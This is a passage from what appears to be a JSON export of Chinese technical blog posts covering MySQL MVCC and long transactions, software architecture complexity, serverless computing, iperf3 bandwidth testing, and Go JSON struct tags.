被按顺序改成了 2、3、4，在回滚日志里面就会有类似下面的记录。 当前值是 4，但是在查询这条记录的时候，不同时刻启动的事务会有不同的 read-view。如图中看到的，在视图 A、B、C 里面，这一个记录的值分别是 1、2、4，同一条记录在系统中可以存在多个版本，就是数据库的多版本并发控制（MVCC）。对于 read-view A，要得到 1，就必须将当前值依次执行图中所有的回滚操作得到。 同时你会发现，即使现在有另外一个事务正在将 4 改成 5，这个事务跟 read-view A、B、C 对应的事务是不会冲突的。 你一定会问，回滚日志总不能一直保留吧，什么时候删除呢？答案是，在不需要的时候才删除。也就是说，系统会判断，当没有事务再需要用到这些回滚日志时，回滚日志会被删除。 什么时候才不需要了呢？就是当系统里没有比这个回滚日志更早的 read-view 的时候。 基于上面的说明，我们来讨论一下为什么建议你尽量不要使用长事务。 长事务意味着系统里面会存在很老的事务视图。由于这些事务随时可能访问数据库里面的任何数据，所以这个事务提交之前，数据库里面它可能用到的回滚记录都必须保留，这就会导致大量占用存储空间。 在 MySQL 5.5 及以前的版本，回滚日志是跟数据字典一起放在 ibdata 文件里的，即使长事务最终提交，回滚段被清理，文件也不会变小。我见过数据只有 20GB，而回滚段有 200GB 的库。最终只好为了清理回滚段，重建整个库。 事务的启动方式如前面所述，长事务有这些潜在风险，我当然是建议你尽量避免。其实很多时候业务开发同学并不是有意使用长事务，通常是由于误用所致。MySQL 的事务启动方式有以下几种： 显式启动事务语句， begin 或 start transaction。配套的提交语句是 commit，回滚语句是 rollback。 set autocommit=0，这个命令会将这个线程的自动提交关掉。意味着如果你只执行一个 select 语句，这个事务就启动了，而且并不会自动提交。这个事务持续存在直到你主动执行 commit 或 rollback 语句，或者断开连接。 索引一句话简单来说，索引的出现其实就是为了提高数据查询的效率，就像书的目录一样。一本 500 页的书，如果你想快速找到其中的某一个知识点，在不借助目录的情况下，那我估计你可得找一会儿。同样，对于数据库的表而言，索引其实就是它的“目录”。","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Architecture】架构学习","date":"2020-04-11T10:02:24.000Z","path":"2020/04/11/【Architecture】架构学习/","text":"基本概念包括：系统与子系统、模块与组件、框架与架构。 系统与子系统我们先来看维基百科定义的“系统”。系统泛指由一群有关联的个体组成，根据某种规则运作，能完成个别元件不能单独完成的工作的群体。它的意思是“总体”“整体”或“联盟”。 我来提炼一下里面的关键内容： 关联：系统是由一群有关联的个体组成的，没有关联的个体堆在一起不能成为一个系统。例如，把一个发动机和一台 PC 放在一起不能称之为一个系统，把发动机、底盘、轮胎、车架组合起来才能成为一台汽车。 规则：系统内的个体需要按照指定的规则运作，而不是单个个体各自为政。规则规定了系统内个体分工和协作的方式。例如，汽车发动机负责产生动力，然后通过变速器和传动轴，将动力输出到车轮上，从而驱动汽车前进。 能力：系统能力与个体能力有本质的差别，系统能力不是个体能力之和，而是产生了新的能力。例如，汽车能够载重前进，而发动机、变速器、传动轴、车轮本身都不具备这样的能力。 我们再来看子系统的定义。 子系统也是由一群有关联的个体所组成的系统，多半会是更大系统中的一部分。 其实子系统的定义和系统定义是一样的，只是观察的角度有差异，一个系统可能是另外一个更大系统的子系统。 模块（module）与组件（component）模块和组件两个概念在实际工作中很容易混淆，我们经常能够听到类似这样的说法： MySQL 模块主要负责存储数据，而 ElasticSearch 模块主要负责数据搜索。 我们有安全加密组件、有审核组件。 App 的下载模块使用了第三方的组件。 造成这种现象的主要原因是，模块与组件的定义并不好理解，也不能很好地进行区分。我们来看看这两者在维基百科上的定义。 软件模块（Module）是一套一致而互相有紧密关连的软件组织。它分别包含了程序和数据结构两部分。现代软件开发往往利用模块作为合成的单位。模块的接口表达了由该模块提供的功能和调用它时所需的元素。模块是可能分开被编写的单位。这使它们可再用和允许人员同时协作、编写及研究不同的模块。软件组件定义为自包含的、可编程的、可重用的、与语言无关的软件单元，软件组件可以很容易被用于组装应用程序中。 可能你看完这两个定义后一头雾水，还是不知道这两者有什么区别。造成这种现象的根本原因是，模块和组件都是系统的组成部分，只是从不同的角度拆分系统而已。 从业务逻辑的角度来拆分系统后，得到的单元就是“模块”； 从物理的角度来拆分系统后，得到的单元就是“组件”。 划分模块的主要目的是职责分离；划分组件的主要目的是单元复用。其实，“组件”的英文 component 也可翻译成中文的“零件”一词，“零件”更容易理解一些，“零件”是一个物理的概念，并且具备“独立且可替换”的特点。 我以一个最简单的网站系统来为例。假设我们要做一个学生信息管理系统，这个系统从业务逻辑的角度来拆分，可以分为“登录注册模块”“个人信息模块”“个人成绩模块”；从物理的角度来拆分，可以拆分为 Nginx、Web 服务器、MySQL。 框架（Framework）与架构（Architecture）框架是和架构比较相似的概念，且两者有较强的关联关系，所以在实际工作中，这两个概念有时我们容易分不清楚。参考维基百科上框架与架构的定义，我来解释两者的区别。 软件框架（Software framework）通常指的是为了实现某个业界标准或完成特定基本任务的软件组件规范，也指为了实现某个软件组件规范时，提供规范所要求之基础功能的软件产品。 我来提炼一下其中关键部分： 框架是组件规范：例如，MVC 就是一种最常见的开发规范，类似的还有 MVP、MVVM、J2EE 等框架。 框架提供基础功能的产品：例如，Spring MVC 是 MVC 的开发框架，除了满足 MVC 的规范，Spring 提供了很多基础功能来帮助我们实现功能，包括注解（@Controller 等）、Spring Security、Spring JPA 等很多基础功能。 软件架构指软件系统的“基础结构”，创造这些基础结构的准则，以及对这些结构的描述。 单纯从定义的角度来看，框架和架构的区别还是比较明显的，框架关注的是“规范”，架构关注的是“结构”。框架的英文是 Framework，架构的英文是 Architecture。Spring MVC 的英文文档标题就是“Web MVC framework”。 从业务逻辑的角度分解，“学生管理系统”的架构是： 从物理部署的角度分解，“学生管理系统”的架构是： 从开发规范的角度分解，“学生管理系统”可以采用标准的 MVC 框架来开发，因此架构又变成了 MVC 架构： 这些“架构”，都是“学生管理系统”正确的架构，只是从不同的角度来分解而已，这也是 IBM 的 RUP 将软件架构视图分为著名的“4+1 视图”的原因。 软件架构的历史背景虽然早在 20 世纪 60 年代，戴克斯特拉这位上古大神就已经涉及软件架构这个概念了，但软件架构真正流行却是从 20 世纪 90 年代开始的，由于在 Rational 和 Microsoft 内部的相关活动，软件架构的概念开始越来越流行了。 与之前的各种新方法或者新理念不同的是，“软件架构”出现的背景并不是整个行业都面临类似相同的问题，“软件架构”也不是为了解决新的软件危机而产生的，这是怎么回事呢？ 卡内基·梅隆大学的玛丽·肖（Mary Shaw）和戴维·加兰（David Garlan）对软件架构做了很多研究，他们在 1994 年的一篇文章《软件架构介绍》（An Introduction to Software Architecture）中写到： “When systems are constructed from many components, the organization of the overall system-the software architecture-presents a new set of design problems.” 简单翻译一下：随着软件系统规模的增加，计算相关的算法和数据结构不再构成主要的设计问题；当系统由许多部分组成时，整个系统的组织，也就是所说的“软件架构”，导致了一系列新的设计问题。 这段话很好地解释了“软件架构”为何先在 Rational 或者 Microsoft 这样的大公司开始逐步流行起来。因为只有大公司开发的软件系统才具备较大规模，而只有规模较大的软件系统才会面临软件架构相关的问题，例如： 系统规模庞大，内部耦合严重，开发效率低； 系统耦合严重，牵一发动全身，后续修改和扩展困难； 系统逻辑复杂，容易出问题，出问题后很难排查和修复。 软件架构的出现有其历史必然性。20 世纪 60 年代第一次软件危机引出了“结构化编程”，创造了“模块”概念；20 世纪 80 年代第二次软件危机引出了“面向对象编程”，创造了“对象”概念；到了 20 世纪 90 年代“软件架构”开始流行，创造了“组件”概念。我们可以看到，“模块”“对象”“组件”本质上都是对达到一定规模的软件进行拆分，差别只是在于随着软件的复杂度不断增加，拆分的粒度越来越粗，拆分的层次越来越高。 架构设计的真正目的那架构设计的真正目的究竟是什么？从周二与你分享的架构设计的历史背景，可以看到，整个软件技术发展的历史，其实就是一部与“复杂度”斗争的历史，架构的出现也不例外。简而言之，架构也是为了应对软件系统复杂度而提出的一个解决方案，通过回顾架构产生的历史背景和原因，我们可以基本推导出答案：架构设计的主要目的是为了解决软件系统复杂度带来的问题。 这个结论虽然很简洁，但却是架构设计过程中需要时刻铭记在心的一条准则，为什么这样说呢？ 首先，遵循这条准则能够让“新手”架构师心中有数，而不是一头雾水。 新手架构师开始做架构设计的时候，心情都很激动，希望大显身手，甚至恨不得一出手就设计出世界上最牛的 XX 架构，从此走上人生巅峰，但真的面对具体的需求时，往往都会陷入一头雾水的状态： 简单的复杂度分析案例我来分析一个简单的案例，一起来看看如何将“架构设计的真正目的是为了解决软件系统复杂度带来的问题”这个指导思想应用到实践中。 假设我们需要设计一个大学的学生管理系统，其基本功能包括登录、注册、成绩管理、课程管理等。当我们对这样一个系统进行架构设计的时候，首先应识别其复杂度到底体现在哪里。 性能：一个学校的学生大约 1 ~ 2 万人，学生管理系统的访问频率并不高，平均每天单个学生的访问次数平均不到 1 次，因此性能这部分并不复杂，存储用 MySQL 完全能够胜任，缓存都可以不用，Web 服务器用 Nginx 绰绰有余。 可扩展性：学生管理系统的功能比较稳定，可扩展的空间并不大，因此可扩展性也不复杂。 高可用：学生管理系统即使宕机 2 小时，对学生管理工作影响并不大，因此可以不做负载均衡，更不用考虑异地多活这类复杂的方案了。但是，如果学生的数据全部丢失，修复是非常麻烦的，只能靠人工逐条修复，这个很难接受，因此需要考虑存储高可靠，这里就有点复杂了。我们需要考虑多种异常情况：机器故障、机房故障，针对机器故障，我们需要设计 MySQL 同机房主备方案；针对机房故障，我们需要设计 MySQL 跨机房同步方案。 安全性：学生管理系统存储的信息有一定的隐私性，例如学生的家庭情况，但并不是和金融相关的，也不包含强隐私（例如玉照、情感）的信息，因此安全性方面只要做 3 个事情就基本满足要求了：Nginx 提供 ACL 控制、用户账号密码管理、数据库访问权限控制。 成本：由于系统很简单，基本上几台服务器就能够搞定，对于一所大学来说完全不是问题，可以无需太多关注。 还有其他方面，如果有兴趣，你可以自行尝试去分析。通过我上面的分析，可以看到这个方案的主要复杂性体现在存储可靠性上，需要保证异常的时候，不要丢失所有数据即可（丢失几个或者几十个学生的信息问题不大），对应的架构如下： 复杂度的来源高性能对性能孜孜不倦的追求是整个人类技术不断发展的根本驱动力。例如计算机，从电子管计算机到晶体管计算机再到集成电路计算机，运算性能从每秒几次提升到每秒几亿次。但伴随性能越来越高，相应的方法和系统复杂度也是越来越高。现代的计算机 CPU 集成了几亿颗晶体管，逻辑复杂度和制造复杂度相比最初的晶体管计算机，根本不可同日而语。 软件系统也存在同样的现象。最近几十年软件系统性能飞速发展，从最初的计算机只能进行简单的科学计算，到现在 Google 能够支撑每秒几万次的搜索。与此同时，软件系统规模也从单台计算机扩展到上万台计算机；从最初的单用户单工的字符界面 Dos 操作系统，到现在的多用户多工的 Windows 10 图形操作系统。 软件系统中高性能带来的复杂度主要体现在两方面，一方面是单台计算机内部为了高性能带来的复杂度；另一方面是多台计算机集群为了高性能带来的复杂度。 单机复杂度计算机内部复杂度最关键的地方就是操作系统。计算机性能的发展本质上是由硬件发展驱动的，尤其是 CPU 的性能发展。著名的“摩尔定律”表明了 CPU 的处理能力每隔 18 个月就翻一番；而将硬件性能充分发挥出来的关键就是操作系统，所以操作系统本身其实也是跟随硬件的发展而发展的，操作系统是软件系统的运行环境，操作系统的复杂度直接决定了软件系统的复杂度。 操作系统和性能最相关的就是进程和线程。最早的计算机其实是没有操作系统的，只有输入、计算和输出功能，用户输入一个指令，计算机完成操作，大部分时候计算机都在等待用户输入指令，这样的处理性能很显然是很低效的，因为人的输入速度是远远比不上计算机的运算速度的。 为了解决手工操作带来的低效，批处理操作系统应运而生。批处理简单来说就是先把要执行的指令预先写下来（写到纸带、磁带、磁盘等），形成一个指令清单，这个指令清单就是我们常说的“任务”，然后将任务交给计算机去执行，批处理操作系统负责读取“任务”中的指令清单并进行处理，计算机执行的过程中无须等待人工手工操作，这样性能就有了很大的提升。 批处理程序大大提升了处理性能，但有一个很明显的缺点：计算机一次只能执行一个任务，如果某个任务需要从 I/O 设备（例如磁带）读取大量的数据，在 I/O 操作的过程中，CPU 其实是空闲的，而这个空闲时间本来是可以进行其他计算的。 为了进一步提升性能，人们发明了“进程”，用进程来对应一个任务，每个任务都有自己独立的内存空间，进程间互不相关，由操作系统来进行调度。此时的 CPU 还没有多核和多线程的概念，为了达到多进程并行运行的目的，采取了分时的方式，即把 CPU 的时间分成很多片段，每个片段只能执行某个进程中的指令。虽然从操作系统和 CPU 的角度来说还是串行处理的，但是由于 CPU 的处理速度很快，从用户的角度来看，感觉是多进程在并行处理。 多进程虽然要求每个任务都有独立的内存空间，进程间互不相关，但从用户的角度来看，两个任务之间能够在运行过程中就进行通信，会让任务设计变得更加灵活高效。否则如果两个任务运行过程中不能通信，只能是 A 任务将结果写到存储，B 任务再从存储读取进行处理，不仅效率低，而且任务设计更加复杂。为了解决这个问题，进程间通信的各种方式被设计出来了，包括管道、消息队列、信号量、共享存储等。 多进程让多任务能够并行处理任务，但本身还有缺点，单个进程内部只能串行处理，而实际上很多进程内部的子任务并不要求是严格按照时间顺序来执行的，也需要并行处理。例如，一个餐馆管理进程，排位、点菜、买单、服务员调度等子任务必须能够并行处理，否则就会出现某个客人买单时间比较长（比如说信用卡刷不出来），其他客人都不能点菜的情况。为了解决这个问题，人们又发明了线程，线程是进程内部的子任务，但这些子任务都共享同一份进程数据。为了保证数据的正确性，又发明了互斥锁机制。有了多线程后，操作系统调度的最小单位就变成了线程，而进程变成了操作系统分配资源的最小单位。 多进程多线程虽然让多任务并行处理的性能大大提升，但本质上还是分时系统，并不能做到时间上真正的并行。解决这个问题的方式显而易见，就是让多个 CPU 能够同时执行计算任务，从而实现真正意义上的多任务并行。目前这样的解决方案有 3 种：SMP（Symmetric Multi-Processor，对称多处理器结构）、NUMA（Non-Uniform Memory Access，非一致存储访问结构）、MPP（Massive Parallel Processing，海量并行处理结构）。其中 SMP 是我们最常见的，目前流行的多核处理器就是 SMP 方案。 操作系统发展到现在，如果我们要完成一个高性能的软件系统，需要考虑如多进程、多线程、进程间通信、多线程并发等技术点，而且这些技术并不是最新的就是最好的，也不是非此即彼的选择。在做架构设计的时候，需要花费很大的精力来结合业务进行分析、判断、选择、组合，这个过程同样很复杂。举一个最简单的例子：Nginx 可以用多进程也可以用多线程，JBoss 采用的是多线程；Redis 采用的是单进程，Memcache 采用的是多线程，这些系统都实现了高性能，但内部实现差异却很大。 集群的复杂度虽然计算机硬件的性能快速发展，但和业务的发展速度相比，还是小巫见大巫了，尤其是进入互联网时代后，业务的发展速度远远超过了硬件的发展速度。例如： 2016 年“双 11”支付宝每秒峰值达 12 万笔支付。 2017 年春节微信红包收发红包每秒达到 76 万个。 要支持支付和红包这种复杂的业务，单机的性能无论如何是无法支撑的，必须采用机器集群的方式来达到高性能。例如，支付宝和微信这种规模的业务系统，后台系统的机器数量都是万台级别的。 通过大量机器来提升性能，并不仅仅是增加机器这么简单，让多台机器配合起来达到高性能的目的，是一个复杂的任务，我针对常见的几种方式简单分析一下。 任务分配任务分配的意思是指每台机器都可以处理完整的业务任务，不同的任务分配到不同的机器上执行。 我从最简单的一台服务器变两台服务器开始，来讲任务分配带来的复杂性，整体架构示意图如下。 从图中可以看到，1 台服务器演变为 2 台服务器后，架构上明显要复杂多了，主要体现在： 需要增加一个任务分配器，这个分配器可能是硬件网络设备（例如，F5、交换机等），可能是软件网络设备（例如，LVS），也可能是负载均衡软件（例如，Nginx、HAProxy），还可能是自己开发的系统。选择合适的任务分配器也是一件复杂的事情，需要综合考虑性能、成本、可维护性、可用性等各方面的因素。 任务分配器和真正的业务服务器之间有连接和交互（即图中任务分配器到业务服务器的连接线），需要选择合适的连接方式，并且对连接进行管理。例如，连接建立、连接检测、连接中断后如何处理等。 任务分配器需要增加分配算法。例如，是采用轮询算法，还是按权重分配，又或者按照负载进行分配。如果按照服务器的负载进行分配，则业务服务器还要能够上报自己的状态给任务分配器。 任务分解通过任务分配的方式，我们能够突破单台机器处理性能的瓶颈，通过增加更多的机器来满足业务的性能需求，但如果业务本身也越来越复杂，单纯只通过任务分配的方式来扩展性能，收益会越来越低。例如，业务简单的时候 1 台机器扩展到 10 台机器，性能能够提升 8 倍（需要扣除机器群带来的部分性能损耗，因此无法达到理论上的 10 倍那么高），但如果业务越来越复杂，1 台机器扩展到 10 台，性能可能只能提升 5 倍。造成这种现象的主要原因是业务越来越复杂，单台机器处理的性能会越来越低。为了能够继续提升性能，我们需要采取第二种方式：任务分解。 继续以上面“任务分配”中的架构为例，“业务服务器”如果越来越复杂，我们可以将其拆分为更多的组成部分，我以微信的后台架构为例。 通过上面的架构示意图可以看出，微信后台架构从逻辑上将各个子业务进行了拆分，包括：接入、注册登录、消息、LBS、摇一摇、漂流瓶、其他业务（聊天、视频、朋友圈等）。 通过这种任务分解的方式，能够把原来大一统但复杂的业务系统，拆分成小而简单但需要多个系统配合的业务系统。从业务的角度来看，任务分解既不会减少功能，也不会减少代码量（事实上代码量可能还会增加，因为从代码内部调用改为通过服务器之间的接口调用），那为何通过任务分解就能够提升性能呢？ 主要有几方面的因素： 简单的系统更加容易做到高性能 系统的功能越简单，影响性能的点就越少，就更加容易进行有针对性的优化。而系统很复杂的情况下，首先是比较难以找到关键性能点，因为需要考虑和验证的点太多；其次是即使花费很大力气找到了，修改起来也不容易，因为可能将 A 关键性能点提升了，但却无意中将 B 点的性能降低了，整个系统的性能不但没有提升，还有可能会下降。 可以针对单个任务进行扩展 当各个逻辑任务分解到独立的子系统后，整个系统的性能瓶颈更加容易发现，而且发现后只需要针对有瓶颈的子系统进行性能优化或者提升，不需要改动整个系统，风险会小很多。以微信的后台架构为例，如果用户数增长太快，注册登录子系统性能出现瓶颈的时候，只需要优化登录注册子系统的性能（可以是代码优化，也可以简单粗暴地加机器），消息逻辑、LBS 逻辑等其他子系统完全不需要改动。 高可用参考维基百科，先来看看高可用的定义。 系统无中断地执行其功能的能力，代表系统的可用性程度，是进行系统设计时的准则之一。 这个定义的关键在于“无中断”，但恰好难点也在“无中断”上面，因为无论是单个硬件还是单个软件，都不可能做到无中断，硬件会出故障，软件会有 bug；硬件会逐渐老化，软件会越来越复杂和庞大…… 除了硬件和软件本质上无法做到“无中断”，外部环境导致的不可用更加不可避免、不受控制。例如，断电、水灾、地震，这些事故或者灾难也会导致系统不可用，而且影响程度更加严重，更加难以预测和规避。 所以，系统的高可用方案五花八门，但万变不离其宗，本质上都是通过“冗余”来实现高可用。通俗点来讲，就是一台机器不够就两台，两台不够就四台；一个机房可能断电，那就部署两个机房；一条通道可能故障，那就用两条，两条不够那就用三条（移动、电信、联通一起上）。高可用的“冗余”解决方案，单纯从形式上来看，和之前讲的高性能是一样的，都是通过增加更多机器来达到目的，但其实本质上是有根本区别的：高性能增加机器目的在于“扩展”处理性能；高可用增加机器目的在于“冗余”处理单元。 通过冗余增强了可用性，但同时也带来了复杂性，我会根据不同的应用场景逐一分析。 计算高可用这里的“计算”指的是业务的逻辑处理。计算有一个特点就是无论在哪台机器上进行计算，同样的算法和输入数据，产出的结果都是一样的，所以将计算从一台机器迁移到另外一台机器，对业务并没有什么影响。既然如此，计算高可用的复杂度体现在哪里呢？我以最简单的单机变双机为例进行分析。先来看一个单机变双机的简单架构示意图。 你可能会发现，这个双机的架构图和上期“高性能”讲到的双机架构图是一样的，因此复杂度也是类似的，具体表现为： 需要增加一个任务分配器，选择合适的任务分配器也是一件复杂的事情，需要综合考虑性能、成本、可维护性、可用性等各方面因素。 任务分配器和真正的业务服务器之间有连接和交互，需要选择合适的连接方式，并且对连接进行管理。例如，连接建立、连接检测、连接中断后如何处理等。 任务分配器需要增加分配算法。例如，常见的双机算法有主备、主主，主备方案又可以细分为冷备、温备、热备。 存储高可用对于需要存储数据的系统来说，整个系统的高可用设计关键点和难点就在于“存储高可用”。存储与计算相比，有一个本质上的区别：将数据从一台机器搬到到另一台机器，需要经过线路进行传输。线路传输的速度是毫秒级别，同一机房内部能够做到几毫秒；分布在不同地方的机房，传输耗时需要几十甚至上百毫秒。例如，从广州机房到北京机房，稳定情况下 ping 延时大约是 50ms，不稳定情况下可能达到 1s 甚至更多。 高可用状态决策独裁式独裁式决策指的是存在一个独立的决策主体，我们姑且称它为“决策者”，负责收集信息然后进行决策；所有冗余的个体，我们姑且称它为“上报者”，都将状态信息发送给决策者。 协商式协商式决策指的是两个独立的个体通过交流信息，然后根据规则进行决策，最常用的协商式决策就是主备决策。 这个架构的基本协商规则可以设计成： 2 台服务器启动时都是备机。 2 台服务器建立连接。 2 台服务器交换状态信息。 某 1 台服务器做出决策，成为主机；另一台服务器继续保持备机身份。 协商式决策的架构不复杂，规则也不复杂，其难点在于，如果两者的信息交换出现问题（比如主备连接中断），此时状态决策应该怎么做。 民主式民主式决策指的是多个独立的个体通过投票的方式来进行状态决策。例如，ZooKeeper 集群在选举 leader 时就是采用这种方式。 民主式决策和协商式决策比较类似，其基础都是独立的个体之间交换信息，每个个体做出自己的决策，然后按照“多数取胜”的规则来确定最终的状态。不同点在于民主式决策比协商式决策要复杂得多，ZooKeeper 的选举算法 Paxos，绝大部分人都看得云里雾里，更不用说用代码来实现这套算法了。 Reference https://time.geekbang.org/column/article/6458","comments":true,"categories":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"}]},{"title":"【Distributed System】无服务器（Serverless）","date":"2020-04-11T09:53:06.000Z","path":"2020/04/11/【DistributedSystem】无服务器/","text":"什么是无服务器计算？“无服务器”是云计算中资源抽象的极致体现。从它的命名上你就可以看出，所谓“无服务器”就是想让用户感觉不到服务器的存在，这是因为有一朵巨大的云在底层进行着支撑。这样你可以完全专注于业务逻辑的编写，而不再关心任何基础设施。 我们在前面课程的讨论中，其实已经接触到了一些广义上的无服务器 PaaS 服务，比如第 13 讲中的无服务器查询服务和第 14 讲中的无服务器容器服务。甚至第 9 讲中的对象存储服务，它理论上来说也是符合无服务器特征的，因为你不用关心究竟是什么样的机器和多少机器在背后支撑它。 今天我们要来专门讨论的，是经典的无服务器计算服务（Serverless Computing）。“无服务器”这个名称，就是从这种灵活的计算服务起源的。 如果把无服务器计算和容器类服务一起比较的话，这两种云上计算类服务有着共同的优势和特点，比如说，它们都支持细粒度封装和易于大规模扩展。但这两者也有很不一样的地方。 如果说容器是给予了我们很大的定制空间，让你更加容易地按照自己的需要，来进行应用程序的拆分和封装；那么无服务器则是完全屏蔽了计算资源，它是在真正地引导你不再去关心底层环境，你只要遵循标准方式来直接编写业务代码就可以了。 而且在粒度上，无服务器会允许你拆分得更细致、更轻量。你甚至可以把每一个具有独立功能的函数，来作为一个单独的服务进行部署和运行。这也是为什么，在有些云计算的分类方法下，无服务器计算能够单独“开宗立派”，被称为函数即服务（Function-as-a-Service，FaaS）的原因。 Reference https://time.geekbang.org/column/article/206253","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Network】网络测速工具 - iperf3","date":"2020-04-11T09:33:51.000Z","path":"2020/04/11/【Network】网络测速工具-iperf3/","text":"iperf3iperf is a tool for active measurements of the maximum achievable bandwidth on IP networks. It supports tuning of various parameters related to timing, protocols, and buffers. For each test it reports the measured throughput / bitrate, loss, and other parameters. Usage123456789101112131415161718192021222324# server$ iperf3 -s -p 1020# clientiperf3 -c 127.0.0.1 -p 1020Connecting to host 127.0.0.1, port 1020[ 5] local 127.0.0.1 port 51841 connected to 127.0.0.1 port 1020[ ID] Interval Transfer Bitrate[ 5] 0.00-1.00 sec 5.51 GBytes 47.3 Gbits/sec[ 5] 1.00-2.00 sec 5.57 GBytes 47.8 Gbits/sec[ 5] 2.00-3.00 sec 5.44 GBytes 46.7 Gbits/sec[ 5] 3.00-4.00 sec 6.23 GBytes 53.5 Gbits/sec[ 5] 4.00-5.00 sec 6.17 GBytes 53.0 Gbits/sec[ 5] 5.00-6.00 sec 6.11 GBytes 52.5 Gbits/sec[ 5] 6.00-7.00 sec 6.23 GBytes 53.5 Gbits/sec[ 5] 7.00-8.00 sec 6.14 GBytes 52.7 Gbits/sec[ 5] 8.00-9.00 sec 6.17 GBytes 53.0 Gbits/sec[ 5] 9.00-10.00 sec 6.13 GBytes 52.6 Gbits/sec- - - - - - - - - - - - - - - - - - - - - - - - -[ ID] Interval Transfer Bitrate[ 5] 0.00-10.00 sec 59.7 GBytes 51.3 Gbits/sec sender[ 5] 0.00-10.00 sec 59.7 GBytes 51.3 Gbits/sec receiveriperf Done. -p [port]：指定端口 -u：使用UDP -b [target bitrate] ：target bitrate in bits/sec (0 for unlimited) (default 1 Mbit/sec for UDP, unlimited for TCP) -t [duration]：time in seconds to transmit for (default 10 secs) Parameters123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869iperf3: parameter error - must either be a client (-c) or server (-s)Usage: iperf3 [-s|-c host] [options] iperf3 [-h|--help] [-v|--version]Server or Client: -p, --port # server port to listen on/connect to -f, --format [kmgtKMGT] format to report: Kbits, Mbits, Gbits, Tbits -i, --interval # seconds between periodic throughput reports -F, --file name xmit/recv the specified file -B, --bind &lt;host&gt; bind to the interface associated with the address &lt;host&gt; -V, --verbose more detailed output -J, --json output in JSON format --logfile f send output to a log file --forceflush force flushing output at every interval -d, --debug emit debugging output -v, --version show version information and quit -h, --help show this message and quitServer specific: -s, --server run in server mode -D, --daemon run the server as a daemon -I, --pidfile file write PID file -1, --one-off handle one client connection then exit --rsa-private-key-path path to the RSA private key used to decrypt authentication credentials --authorized-users-path path to the configuration file containing user credentialsClient specific: -c, --client &lt;host&gt; run in client mode, connecting to &lt;host&gt; -u, --udp use UDP rather than TCP --connect-timeout # timeout for control connection setup (ms) -b, --bitrate #[KMG][/#] target bitrate in bits/sec (0 for unlimited) (default 1 Mbit/sec for UDP, unlimited for TCP) (optional slash and packet count for burst mode) --pacing-timer #[KMG] set the timing for pacing, in microseconds (default 1000) -t, --time # time in seconds to transmit for (default 10 secs) -n, --bytes #[KMG] number of bytes to transmit (instead of -t) -k, --blockcount #[KMG] number of blocks (packets) to transmit (instead of -t or -n) -l, --length #[KMG] length of buffer to read or write (default 128 KB for TCP, dynamic or 1460 for UDP) --cport &lt;port&gt; bind to a specific client port (TCP and UDP, default: ephemeral port) -P, --parallel # number of parallel client streams to run -R, --reverse run in reverse mode (server sends, client receives) --bidir run in bidirectional mode. Client and server send and receive data. -w, --window #[KMG] set window size / socket buffer size -M, --set-mss # set TCP/SCTP maximum segment size (MTU - 40 bytes) -N, --no-delay set TCP/SCTP no delay, disabling Nagle's Algorithm -4, --version4 only use IPv4 -6, --version6 only use IPv6 -S, --tos N set the IP type of service, 0-255. The usual prefixes for octal and hex can be used, i.e. 52, 064 and 0x34 all specify the same value. --dscp N or --dscp val set the IP dscp value, either 0-63 or symbolic. Numeric values can be specified in decimal, octal and hex (see --tos above). -Z, --zerocopy use a 'zero copy' method of sending data -O, --omit N omit the first n seconds -T, --title str prefix every output line with this string --extra-data str data string to include in client and server JSON --get-server-output get results from server --udp-counters-64bit use 64-bit counters in UDP test packets --repeating-payload use repeating pattern in payload, instead of randomized payload (like in iperf2) --username username for authentication --rsa-public-key-path path to the RSA public key used to encrypt authentication credentials[KMG] indicates options that support a K/M/G suffix for kilo-, mega-, or giga- 各系统下安装macOS下安装1$ brew install iperf OpenWrt下安装12$ opkg update$ opkg install iperf Ubuntu下安装12$ sudo apt-get update$ sudo apt-get install iperf3 Reference https://github.com/esnet/iperf https://iperf.fr/","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Golang】JSON序列化与反序列化","date":"2020-03-30T14:36:43.000Z","path":"2020/03/30/【Golang】使用-JSON序列化与反序列化/","text":"struct转JSON我们可以在struct的attribute后指定该struct被序列化成JSON后的key的值，这被称为Struct Tag。 Struct tag 可以决定 Marshal 和 Unmarshal 函数如何在序列化和反序列化数据时，JSON key的值。 如果没有指定，则取该attribute对应全小写字符串作为key的值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package mainimport ( \"encoding/json\" \"fmt\")type User struct &#123; UserName string `json:\"username\"` NickName string `json:\"nickname\"` Age int Birthday string `json:\"birth\"` Sex string Email string Phone string&#125;/*结构体转json*/func testStruct() &#123; user1 := &amp;User&#123; UserName: \"user1\", NickName: \"上课看似\", Age: 18, Birthday: \"2008/8/8\", Sex: \"男\", Email: \"mahuateng@qq.com\", Phone: \"110\", &#125; dataBytes, err := json.Marshal(user1) if err != nil &#123; fmt.Printf(\"json.marshal failed, err:\", err) return &#125; fmt.Printf(\"%s \\n\", string(dataBytes))&#125;func main() &#123; testStruct() fmt.Println(\"----\")&#125;//output&#123;\"username\":\"user1\",\"nickname\":\"上课看似\",\"Age\":18,\"birth\":\"2008/8/8\",\"Sex\":\"男\",\"Email\":\"mahuateng@qq.com\",\"Phone\":\"110\"&#125; ---- omitempty - 指定 field 是 empty 时的行为使用 omitempty 会告诉 Marshal 函数：当 field 的值是对应类型的 zero-value时，序列化之后的 JSON object 中不包含此 field： 123456type MyStruct struct &#123; SomeField string `json:&quot;some_field,omitempty&quot;`&#125;m := MyStruct&#123;&#125;b, err := json.Marshal(m) //&#123;&#125; 如果 SomeField == “” ，序列化之后的对象就是 {}。 跳过 fieldStruct tag “-” 表示在序列化struct时跳过指定的 filed： 123456type MyStruct struct &#123; SomeField string `json:&quot;some_field&quot;` Passwd string `json:&quot;-&quot;`&#125;m := MyStruct&#123;&#125;b, err := json.Marshal(m) 